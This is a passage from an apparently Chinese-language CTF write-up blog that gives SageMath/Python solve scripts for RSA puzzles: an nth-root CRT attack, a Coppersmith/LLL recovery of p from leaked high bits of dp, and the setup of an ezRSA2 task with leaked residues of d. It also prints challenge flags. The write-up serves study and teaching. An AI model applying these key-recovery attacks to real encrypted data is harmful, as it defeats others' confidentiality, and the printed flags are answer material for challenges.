TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">p = <span class="number">12424840247075830662687097292458444573014198016321428995092662043898159667123240573630892907827505266982898641483333170032514244713840745287869771915696311</span></span><br><span class="line">q = <span class="number">12602471198163266643743702664647336358595911975665358584258749238146841559843060594842063473155049870396568542257767865369797827796765830093256146584311989</span></span><br><span class="line">e = bytes_to_long(<span class="string">&quot;💯&quot;</span>.encode())</span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">c = <span class="number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br><span class="line"></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;TGCTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># TGCTF&#123;🙇🏮🤟_🫡🫡🫡_🚩🚩🚩&#125;😃😖😘😨😢</span></span><br></pre></td></tr></table></figure><h1 id="LitCTF2025-leak-dp高位泄露广义解法"><a href="#LitCTF2025-leak-dp高位泄露广义解法" class="headerlink" title="LitCTF2025 - leak(dp高位泄露广义解法)"></a>LitCTF2025 - leak(dp高位泄露广义解法)</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p,q,e = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>),getPrime(<span class="number">101</span>)</span><br><span class="line">n = p*q</span><br><span class="line">temp = gmpy2.invert(e,p-<span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint = temp&gt;&gt;<span class="number">180</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = 1915595112993511209389477484497</span></span><br><span class="line"><span class="string">n = 12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line"><span class="string">c = 5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line"><span class="string">hint = 10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$e<em>dp\equiv 1(mod\ p-1)$<br>$e</em>(dp_high+x)=k<em>(p-1)+1$<br>$e</em>(dp_high+x)+k-1\equiv 0(mod\ p)$<br>因为这里<code>e</code>太大了，我们打不了<a href="https://www.cnblogs.com/vconlln/p/17066500.html">一元copper</a>，那就直接打<strong>二元copper</strong></p><p>奇怪的是，<code>m</code>代表移位位数，<code>d</code>代表多项式的最高次幂，但这里只能为3才能跑出<code>flag</code>(已经默认跑13了)</p><p>$2^{e<em>dp}\equiv 2(mod\ p)$<br>$p=GCD(2^{e</em>dp}-2,n)$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">e = <span class="number">1915595112993511209389477484497</span></span><br><span class="line">n = <span class="number">12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line">c = <span class="number">5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line">hint = <span class="number">10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line">leak = hint &lt;&lt; <span class="number">180</span></span><br><span class="line">PR.&lt;x,y&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = e*(leak + x) + y -<span class="number">1</span></span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">180</span>,<span class="number">2</span>^e.bit_length()),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    dp = leak + root[<span class="number">0</span>]</span><br><span class="line">    p = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, e*dp, n) -<span class="number">2</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line">    d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure><h1 id="NepCTF2025-ezRSA2"><a href="#NepCTF2025-ezRSA2" class="headerlink" title="NepCTF2025 - ezRSA2"></a>NepCTF2025 - ezRSA2</h1><blockquote><p>Easy RSA, easy strategy. No need to brute force.<br>Perhaps it’s easier than ezRSA in NepCTF 2024.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, getRandomNBitInteger, GCD, inverse, long_to_bytes, bytes_to_long, sieve_base</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_parameters</span>(<span class="params">gamma=<span class="number">0.33</span>, beta=<span class="number">0.33</span></span>):</span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    N = p*q</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = getRandomNBitInteger(<span class="built_in">int</span>(<span class="number">2048</span>*beta))</span><br><span class="line">        <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    e = inverse(d, phi)</span><br><span class="line">    </span><br><span class="line">    hints = []</span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sieve_base)):</span><br><span class="line">        li = sieve_base[i]</span><br><span class="line">        hints.append(d%li)</span><br><span class="line">        M *= li</span><br><span class="line">        <span class="keyword">if</span> M.bit_length() &gt;= <span class="number">1024</span>*gamma:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> e, N, hints</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    e,N,hints = gen_parameters()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e=<span class="subst">&#123;<span class="built_in">hex</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;N=<span class="subst">&#123;<span class="built_in">hex</span>(N)&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hints=<span class="subst">&#123;hints&#125;</span>\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    flag_prefix = <span class="string">b&#x27;NepCTF&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> flag.startswith(flag_prefix)</span><br><span class="line">    <span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    pt = bytes_to_long(flag[<span class="built_in">len</span>(flag_prefix):-<span class="number">1</span>])</span><br><span class="line">    ct = <span class="built_in">pow</span>(pt, e, N)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ct=<span class="subst">&#123;<span class="built_in">hex</span>(ct)&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e=0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line"><span class="string">N=0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hints=[1, 3, 0, 3, 9, 16, 10, 14, 5, 11, 21, 18, 30, 30, 38, 2, 20, 62, 66, 1, 22, 56, 41, 13, 78, 59, 51, 6, 57, 117, 73, 75, 96, 112, 50, 93, 158, 97, 146, 8, 65, 96, 186, 161, 90, 131, 46, 32, 140, 133, 50, 43, 151, 234]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ct=0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这里一下子就可以看到<code>e</code>很大并且接近<code>N</code>，但发现$d\approx N^{0.33}$，大于<strong>boneh durfee</strong> <code>0.292</code>的<strong>上界</strong>，不适用</p><p>然，本题的<code>hints.append(d%li)</code>可以通过<strong>中国剩余定理CRT</strong>求解出<code>d</code>的<strong>低位</strong></p><p>$d_{low}\equiv d\ mod\ M$<br>$d=k_{1}M+d_{low}$</p><p>正常做这种<code>d</code>相关的题目的思路都可以借助下面这条公式，进行展开，尝试<code>copper</code>或者<strong>构造格</strong></p><p>$ed\equiv 1\ mod\ \phi(n)$</p><p>$ed=k*(N-p-q+1)+1$</p><p>因为周末也要<strong>值班</strong>。。。还是<strong>夜班</strong>，加上又不是很想碰<code>CTF</code>，所以当时就想着能不能找到<code>boneh durfee</code>的优化算法，把上界调高，偷个懒，直接梭()<br>很可惜没找到(但赛后群友有说找到的，orz)，然后困了，不想做，等赛后再看看</p><p>到上面这一步，有两种思路</p><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>$e<em>d_{low}+e</em>k_{1}M-1=k_{2}*(N-p-q+1)$</p><p>这里是<code>k1,k2</code>未知(<code>p q</code>暂时不管)，很明显我们可以尝试一下<strong>二元copper</strong>，不过形式得稍微变换一下</p><p>$e<em>d_{low}-1-k</em>(N-p-q+1)\equiv 0\ mod\ (e*M)$</p><p>$令X = k,Y=p+q$</p><p><code>k</code>可以借助题目脚本多跑几下，大概位数在<strong>676位</strong>，<code>p+q</code>很明显<strong>1024位</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">ct = <span 